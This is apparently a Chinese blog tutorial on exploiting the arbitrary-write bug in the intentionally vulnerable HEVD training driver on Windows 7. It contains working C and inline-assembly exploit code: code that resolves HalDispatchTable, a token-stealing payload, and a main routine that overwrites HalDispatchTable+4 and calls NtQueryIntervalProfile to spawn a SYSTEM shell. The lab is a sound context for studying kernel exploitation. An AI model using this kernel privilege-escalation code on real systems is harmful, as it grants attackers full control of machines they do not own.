作者：selph

前言

窥探Ring0漏洞世界：任意内存覆盖

实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

## 漏洞分析

本次实验内容是ArbitraryOverwrite

首先用IDA打开HEVD.sys，搜索IrpDeviceIoCtlHandler

本次实验的是第三个样例，IRP分发函数通过跳转表进行跳转，两项之间的控制码相差4，所以本次实验使用的控制码是：0x22200b，漏洞触发代码：

![](https://image.3001.net/images/20220707/1657186845_62c6aa1d78ed5f96d98ea.png!small)

代码功能是参数提供一个结构，结构里包含一个写入地址，一个写入内容地址，向写入地址里写入指定的内容（4字节），只要能覆盖一个要执行的函数的地址，然后执行这个函数的时候就会调用到内核态的shellcode上去，由此这是个任意地址写入漏洞

## 漏洞利用

### 内核提权\--HalDispatchTable

HalDispatchTable是内核中的一个系统调用表，当获得任意地址写的能力之后，可以使用shellcode地址覆盖HalDispatchTable第二个成员处的HalQuerySystemInformation函数地址：

![](https://image.3001.net/images/20220707/1657186846_62c6aa1e20def179b6b18.png!small)

然后调用NtQueryIntervalProfile函数，就会通过该表获取地址进行调用，windbg查看该函数：

kd> uf nt!NtQueryIntervalProfile  
nt!NtQueryIntervalProfile:  
...  
nt!NtQueryIntervalProfile+0x5d:  
8411cec8 8b4508 mov eax,dword ptr [ebp+8]  
8411cecb 85c0 test eax,eax  
8411cecd 7507 jne nt!NtQueryIntervalProfile+0x6b (8411ced6) Branch  
  
nt!NtQueryIntervalProfile+0x64:  
8411cecf a1acabf383 mov eax,dword ptr [nt!KiProfileInterval (83f3abac)]  
8411ced4 eb05 jmp nt!NtQueryIntervalProfile+0x70 (8411cedb) Branch  
  
nt!NtQueryIntervalProfile+0x6b:  
8411ced6 e83ae5fbff call nt!KeQueryIntervalProfile (840db415)

中间省略无关内容，这个函数里只进行了一次call指令调用KeQueryIntervalProfile：

kd> uf nt!KeQueryIntervalProfile  
...  
nt!KeQueryIntervalProfile+0x14:  
840db429 8945f0 mov dword ptr [ebp-10h],eax  
840db42c 8d45fc lea eax,[ebp-4]  
840db42f 50 push eax  
840db430 8d45f0 lea eax,[ebp-10h]  
840db433 50 push eax  
840db434 6a0c push 0Ch  
840db436 6a01 push 1  
840db438 ff15fcb3f383 call dword ptr [nt!HalDispatchTable+0x4 (83f3b3fc)]  
840db43e 85c0 test eax,eax  
840db440 7c0b jl nt!KeQueryIntervalProfile+0x38 (840db44d) Branch  
  
nt!KeQueryIntervalProfile+0x2d:  
840db442 807df400 cmp byte ptr [ebp-0Ch],0  
840db446 7405 je nt!KeQueryIntervalProfile+0x38 (840db44d) Branch  
  
nt!KeQueryIntervalProfile+0x33:  
840db448 8b45f8 mov eax,dword ptr [ebp-8]  
840db44b c9 leave  
840db44c c3 ret  
  
nt!KeQueryIntervalProfile+0x38:  
840db44d 33c0 xor eax,eax  
840db44f c9 leave  
840db450 c3 ret

这个函数里依然进行了一次call指令，可以看到调用的是HalDispatchTable+4的函数，也正是我们要进行覆盖的函数，这个函数不管返回什么，都不会使得后续产生什么不良影响（也就是说，选择覆盖这个函数主要是覆盖不会影响系统奔溃）

到这里进行利用的思路已经逐渐清晰了起来，第一步：找到HalDispatchTable地址

### 找到HalDispatchTable地址

查阅资料[1]可知：

1.找到内核模块ntkrnlpa.exe的内核基址：使用EnumDeviceDrivers函数枚举配合GetDeviceDriverBaseNameA函数获取模块名称进行判断

2.用户模式加载内核模块ntkrnlpa.exe，通过GetProcAddress函数获取HalDispatchTable的地址，计算出与基址的偏移量

3.计算HalDispatchTable在内核模块的地址：基址+偏移

实现如下：

//获取驱动模块基地址  
LPVOID GetDriverBase(LPCSTR lpDriverName)  
{  
LPVOID lpImageBase[1024];  
DWORD lpcbNeeded;  
char lpfileName[1024];  
//Retrieves the load address for each device driver in the system  
EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);  
  
for (int i = 0; i < 1024; i++)  
{  
//Retrieves the base name of the specified device driver  
GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);  
  
if (!strcmp(lpfileName, lpDriverName))  
{  
printf("[+]success to get %s\n", lpfileName);  
return lpImageBase[i];  
}  
}  
return NULL;  
}  
  
// 计算内核HalDispatchTable地址  
PVOID GetHalDispatchTable() {  
LPVOID pKernelBase = GetDriverBase("ntkrnlpa.exe");  
HMODULE pUserBase = LoadLibraryA("ntkrnlpa.exe");  
PVOID pUserHalDispatchTable = GetProcAddress(pUserBase, "HalDispatchTable");  
DWORD dwOffset = (DWORD)pUserHalDispatchTable - (DWORD)pUserBase;  
  
PVOID pKernelHalDispatchTable = (PVOID)((DWORD)pKernelBase + dwOffset);  
  
return pKernelHalDispatchTable;  
}

### 构造利用代码：

不用管返回值，只需要执行完令牌替换就行：

VOID TokenStealingPayloadWin7() {  
// Importance of Kernel Recovery  
__asm {  
pushad  
  
获取当前进程EPROCESS  
xor eax, eax  
mov eax, fs: [eax + KTHREAD_OFFSET]  
mov eax, [eax + EPROCESS_OFFSET]  
mov ecx, eax  
  
搜索system进程EPROCESS  
mov edx, SYSTEM_PID  
SearchSystemPID :  
mov eax, [eax + FLINK_OFFSET]  
sub eax, FLINK_OFFSET  
cmp[eax + PID_OFFSET], edx  
jne SearchSystemPID  
  
token窃取  
mov edx, [eax + TOKEN_OFFSET]  
mov[ecx + TOKEN_OFFSET], edx  
  
环境还原\+ 返回  
popad  
}  
}

### 编写exp

要调用的是ntdll.dll里的函数NtQueryIntervalProfile，因为没法直接用，所以需要间接获取地址，构造函数指针进行调用，整体利用流程如下：

typedef struct _WRITE_WHAT_WHERE {  
PULONG_PTR What;  
PULONG_PTR Where;  
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;  
  
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT
PULONG Interval);  
  
int main()  
{  
  
ULONG UserBufferSize = sizeof(WRITE_WHAT_WHERE);  
PVOID EopPayload = &ampTokenStealingPayloadWin7  
  
HANDLE hDevice = ::CreateFileW(L"\\\\\\\\.\\\HacksysExtremeVulnerableDriver",
GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);  
if (hDevice == INVALID_HANDLE_VALUE) {  
printf("[ERROR]Open Device Error\r\n");  
system("pause");  
exit(1);  
}  
else {  
printf("[INFO]Device Handle: 0x%X\n", hDevice);  
}  
  
WRITE_WHAT_WHERE* UserBuffer = (WRITE_WHAT_WHERE*)HeapAlloc(GetProcessHeap(),
HEAP_ZERO_MEMORY, UserBufferSize);  
if (!UserBuffer) {  
printf("[ERROR]Allocate ERROR");  
system("pause");  
  
exit(1);  
}  
else {  
printf("[INFO]Allocated Memory: 0x%p\n", UserBuffer);  
printf("[INFO]Allocation Size: 0x%X\n", UserBufferSize);  
}  
  
PVOID HalDispatchTable = GetHalDispatchTable();  
  
UserBuffer->What = (PULONG_PTR)&ampEopPayload  
UserBuffer->Where = (PULONG_PTR)((DWORD)HalDispatchTable + sizeof(PVOID));  
  
ULONG WriteRet = 0;  
DeviceIoControl(hDevice, 0x222003 + 4*2, (LPVOID)UserBuffer, UserBufferSize,
NULL, 0, &WriteRet, NULL);  
  
// 触发漏洞  
HMODULE hNtDll = LoadLibraryA("ntdll.dll");  
NtQueryIntervalProfile_t NtQueryIntervalProfile =
(NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");  
ULONG Interval = 0;  
NtQueryIntervalProfile(0x1337, &Interval);  
  
HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);  
UserBuffer = NULL;  
  
system("pause");  
system("cmd.exe");  
  
return 0;  
}

### 效果展示

![](https://image.3001.net/images/20220707/1657186846_62c6aa1ebf37356fdda1e.png!small)

## 参考资料

•[1] windows提权基础知识\- 食兔人的博客(ycdxsb.cn) https://blog.ycdxsb.cn/2acbaae3.html

•[2] HAL_DISPATCH (geoffchappell.com)
https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/hal/hal_dispatch.htm

•[3] FuzzySecurity | Windows ExploitDev: Part 11
https://www.fuzzysecurity.com/tutorials/expDev/15.html

•[4] [原创]Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com https://bbs.pediy.com/thread-252506.htm

